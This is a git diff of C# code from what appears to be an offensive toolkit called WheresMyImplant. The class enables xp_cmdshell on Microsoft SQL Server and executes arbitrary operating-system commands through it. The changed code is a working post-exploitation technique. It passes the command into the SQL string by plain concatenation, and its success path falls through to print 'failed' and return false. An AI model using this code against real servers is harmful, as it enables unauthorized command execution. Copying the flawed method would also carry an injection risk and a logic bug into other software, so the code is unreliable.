@@ -10,59 +10,70 @@ using System.Reflection;
 
 namespace WheresMyImplant
 {
-    class RunXPCmdShell : BaseSQL
+    class RunXPCmdShell : BaseSQL, IDisposable
     {
-        internal RunXPCmdShell(string server, string database, string username, string password, string command) : base(server, database, username, password)
-        {
-            Boolean sp_configure_advanced = false;
-            Boolean sp_configure_cmdshell = false;
+        private Boolean sp_configure_advanced = false;
+        private Boolean sp_configure_cmdshell = false;
 
+        internal RunXPCmdShell(String server, String database, String username, String password) : base(server, database, username, password)
+        {
+        }
+
+        ////////////////////////////////////////////////////////////////////////////////
+        // 
+        ////////////////////////////////////////////////////////////////////////////////
+        internal Boolean EnableXPCmdShell()
+        {
             
-            Console.WriteLine("[*] Connection String: " + connectionString);
-            ////////////////////////////////////////////////////////////////////////////////
             Console.WriteLine("[*] Testing if xp_cmdshell is enabled");
-            if ("0" == ExecuteQuery("sp_configure 'xp_cmdshell'").TrimEnd())
-            {
-                Console.WriteLine("[-] xp_cmdshell is disabled");
-                Console.WriteLine("[*] Attempting to enable");
-                ////////////////////////////////////////////////////////////////////////////////
-                if ("0" == ExecuteQuery("sp_configure 'Show Advanced Options'").TrimEnd())
-                {
-                    Console.WriteLine("[-] Show Advanced Options is disabled");
-                    ////////////////////////////////////////////////////////////////////////////////
-                    Console.WriteLine("[*] Attempting to enable Show Advanced Options");
-                    ExecuteQuery("sp_configure 'Show Advanced Options',1;RECONFIGURE");
-                    if ("0" == ExecuteQuery("sp_configure 'Show Advanced Options'"))
-                    {
-                        Console.WriteLine("[-] Enabling Show Advanced Options failed");
-                    }
-                    else
-                    {
-                        Console.WriteLine("[+] Enabling Show Advanced Options succeeded");
-                        sp_configure_advanced = true;
-                    }
-                }
-                ////////////////////////////////////////////////////////////////////////////////
-                Console.WriteLine("[*] Attempting to enable xp_cmdshell");
-                if ("0" == ExecuteQuery("sp_configure 'xp_cmdshell',1;RECONFIGURE").TrimEnd())
-                {
-                    Console.WriteLine("[-] Enabling xp_cmdshell failed");
-                }
-                else
-                {
-                    Console.WriteLine("[+] Enabling xp_cmdshell succeeded");
-                    sp_configure_cmdshell = true;
-                }
-            }
-            else
+            if ("0" != ExecuteQuery("sp_configure 'xp_cmdshell'").TrimEnd())
             {
                 Console.WriteLine("[+] xp_cmdshell is enabled");
+                return true;
             }
-            ////////////////////////////////////////////////////////////////////////////////
-            Console.WriteLine("[+] Executing query");
+
+            Console.WriteLine("[-] xp_cmdshell is disabled");
+            Console.WriteLine("[*] Attempting to enable");
+            if ("0" == ExecuteQuery("sp_configure 'Show Advanced Options'").TrimEnd())
+            {
+                Console.WriteLine("[-] Show Advanced Options is disabled");
+
+                Console.WriteLine("[*] Attempting to enable Show Advanced Options");
+                ExecuteQuery("sp_configure 'Show Advanced Options',1;RECONFIGURE");
+                if ("0" == ExecuteQuery("sp_configure 'Show Advanced Options'"))
+                {
+                    Console.WriteLine("[-] Enabling Show Advanced Options failed");
+                    return false;
+                }
+                Console.WriteLine("[+] Enabling Show Advanced Options succeeded");
+                sp_configure_advanced = true;
+            }
+
+            Console.WriteLine("[*] Attempting to enable xp_cmdshell");
+            if ("0" != ExecuteQuery("sp_configure 'xp_cmdshell',1;RECONFIGURE").TrimEnd())
+            {
+                Console.WriteLine("[+] Enabling xp_cmdshell succeeded");
+                sp_configure_cmdshell = true;
+            }
+            Console.WriteLine("[-] Enabling xp_cmdshell failed");
+            return false;
+        }
+
+        ////////////////////////////////////////////////////////////////////////////////
+        // 
+        ////////////////////////////////////////////////////////////////////////////////
+        internal void Execute(String command)
+        {
+            Console.WriteLine("[*] Executing query");
             Console.WriteLine(ExecuteQuery("EXEC master..xp_cmdshell '" + command + "'").TrimEnd());
             Console.WriteLine("[+] Query completed");
-            ////////////////////////////////////////////////////////////////////////////////
+        }
+
+        ////////////////////////////////////////////////////////////////////////////////
+        // 
+        ////////////////////////////////////////////////////////////////////////////////
+        public void Dispose()
+        { 
             if (sp_configure_cmdshell)
             {
                 Console.WriteLine("[*] Attempting to disable xp_cmdshell");
@@ -77,7 +88,7 @@ namespace WheresMyImplant
                     Console.WriteLine("[-] sp_configure 'xp_cmdshell',0;RECONFIGURE");
                 }
             }
-            ////////////////////////////////////////////////////////////////////////////////
+            
             if (sp_configure_advanced)
             {
                 Console.WriteLine("[*] Attempting to disable xp_cmdshell");
